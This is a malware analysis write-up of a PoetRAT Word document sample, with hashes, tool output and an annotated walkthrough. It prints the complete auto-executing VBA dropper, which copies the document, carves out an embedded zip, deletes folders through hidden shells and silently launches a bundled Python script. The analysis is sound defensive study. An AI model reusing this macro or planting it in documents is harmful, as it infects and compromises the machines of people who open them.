# PoetRAT

__MD5:__ 3aadbf7e527fc1a050e1c97fea1cba4d

__SHA256:__ 208ec23c233580dbfc53aad5655845f7152ada56dd6a5c780d54e84a9d227407

__Sample source:__ https://github.com/UVvirus/malware_samples/tree/main/Poetrat

## Static Analysis

Ran `file` command on the sample.

![](img/file.png)

Okay, so what is a composite document? Let's perform a google search!

According to Wikipedia:

![](img/wiki.png)

Let's search this file on VirusTotal.

![](img/vt.png)

So, now we know that the file is malicious. Let's explore this file more.

Performing some Google research, I found that it is somewhat similar to Microsoft Word Document.

Since, word documents can have macros enabled, I'll use a tool called `olevba` to extract the macros from the document.

```vb
===============================================================================
FILE: poetrat
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: poetrat - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub document_open()
    ActiveDocument.ActiveWindow.View.ReadingLayout = False
    ActiveDocument.Unprotect "securePass"
    show
    ActiveDocument.Protect wdAllowOnlyReading, True, "securePass", False, False
    
    Dim data As String
    Dim User As String
    Dim bla As String
    Dim Coper As Object
    User = "C:\Users\Public"

    Docer = ActiveDocument.FullName
    
    'Copy
    Call Shell("cmd /c copy " + Docer + " " + User + "\docer.doc", vbHide)
    deay (4)
    data = bin2var(User + "\docer.doc")
    data = Right(data, 7074638)
    var2bin User + "\smile.zip", data
    
    bla = VBA.FileSystem.Dir(User + "\Python37", vbDirectory)
    If bla <> VBA.Constants.vbNullString Then
        Call Shell("cmd /c rmdir /s /q " + User + "\Python37", vbHide)
        deay (2)
    End If
    'Unzip
    Unzip User + "\smile.zip", User, "Python37"
    'Clean
    Kill User + "\smile.zip"
    Kill User + "\docer.doc"
    'Run
    Call Shell("""" & User & "\Python37\python.exe" & """ """ & User & "\Python37\launcher.py" & """", vbHide)
End Sub

Function bin2var(filename As String) As String

'Which alters when it alteration finds,
'Or bends with the remover to remove.
    Dim f As Integer
    f = FreeFile()
    Open filename For Binary Access Read Lock Write As #f
        bin2var = Space(FileLen(filename))
        Get #f, , bin2var
    Close #f
'O no! it is an ever-fixed mark
'That looks on tempests and is never shaken;

End Function
'It is the star to every wand'ring bark,
'Whose worth 's unknown, although his height be taken.
'Love 's not Time's fool, though rosy lips and cheeks
'Within his bending sickle's compass come;

Sub var2bin(filename As String, data As String)

'If this be error and upon me prov'd,
'I never writ, nor no man ever lov'd.
    Dim f As Integer
    f = FreeFile()
    Open filename For Output Access Write Lock Write As #f
        Print #f, data;
    Close #f
End Sub
'Love alters not with his brief hours and weeks,
'But bears it out even to the edge of doom.

Sub Unzip(Fname As Variant, DefPath As String, TarFold As String)
    Dim oApp As Object
    Dim FileNameFolder As Variant

    'Root folder for the new folder.
    If Right(DefPath, 1) <> "\" Then
        DefPath = DefPath & "\"
    End If

    'Create the folder name
    strDate = Format(Now, " dd-mm-yy h-mm-ss")
    FileNameFolder = DefPath & TarFold & "\"

    'Make the normal folder in DefPath
    MkDir FileNameFolder

    'Extract the files into the newly created folder
    Set oApp = CreateObject("Shell.Application")
    oApp.Namespace(FileNameFolder).CopyHere oApp.Namespace(Fname).items, 4
End Sub


Sub hide()
    ActiveDocument.Sections(1).Range.Font.Hidden = False
    For Each Section In ActiveDocument.Sections
        If Section.Index > 1 Then Section.Range.Font.Hidden = True
    Next
End Sub

Sub show()
    ActiveDocument.Sections(1).Range.Font.Hidden = True
    For Each Section In ActiveDocument.Sections
        If Section.Index > 1 Then Section.Range.Font.Hidden = False
    Next
End Sub

Function deay(min)

  Dim ptr
  ptr = DateAdd("s", min, Time())
  If ptr > Time() Then
    Do Until (Time() > ptr)
    Loop
  End If

End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|CopyHere            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Shell.Application   |May run an application (if combined with     |
|          |                    |CreateObject)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |python.exe          |Executable file name                         |
+----------+--------------------+---------------------------------------------+
```

_`olevba` also prints suspicious code present in the file._

### VBA Script Analysis

So, as we can see that when we open the document this code will be executed:

```vb
Sub document_open()
    'This closes the reading layout view.
    ActiveDocument.ActiveWindow.View.ReadingLayout = False
    
    'This removes the protection form the document
    ActiveDocument.Unprotect "securePass"
    show
    
    'This will allow only reading access to the document
    ActiveDocument.Protect wdAllowOnlyReading, True, "securePass", False, False
    
    'Defining some variables
    Dim data As String
    Dim User As String
    Dim bla As String
    Dim Coper As Object
    User = "C:\Users\Public"

    'String containing the path and name of this document
    Docer = ActiveDocument.FullName
    
    'Opens a hidden shell and copies the document and places it in C:\Users\Public as docer.doc
    Call Shell("cmd /c copy " + Docer + " " + User + "\docer.doc", vbHide)
    deay (4)
    
    'Calls bin2var passing the document as arguement
    data = bin2var(User + "\docer.doc")
```

Let's analyze `bin2var()` function:

```vb
'This opens the supplied file as binary data
Function bin2var(filename As String) As String
    Dim f As Integer
    f = FreeFile()
    Open filename For Binary Access Read Lock Write As #f
        bin2var = Space(FileLen(filename))
        Get #f, , bin2var
    Close #f
End Function
```

Comming back to our flow (`document_open()`);

```vb
    'Assigns 7074638 characters from right
    data = Right(data, 7074638)
    
    'var2bin C:\Users\Public\smile.zip, data
    var2bin User + "\smile.zip", data
    'Basically, the binary data is being converted and created into a zip file.

    'Returns the path for Python37
    bla = VBA.FileSystem.Dir(User + "\Python37", vbDirectory)
    If bla <> VBA.Constants.vbNullString Then

        'Deletes all files under Python37 directory
        Call Shell("cmd /c rmdir /s /q " + User + "\Python37", vbHide)
        deay (2)
    End If

    'Unzip the zip file to C:\Users\Public\Python37
    Unzip User + "\smile.zip", User, "Python37"
    
    'Deletes the zip and the document file
    Kill User + "\smile.zip"
    Kill User + "\docer.doc"
    
    'Executes launcher.py (which was extracted from the smile.zip) in hidden mode 
    Call Shell("""" & User & "\Python37\python.exe" & """ """ & User & "\Python37\launcher.py" & """", vbHide)
End Sub
```

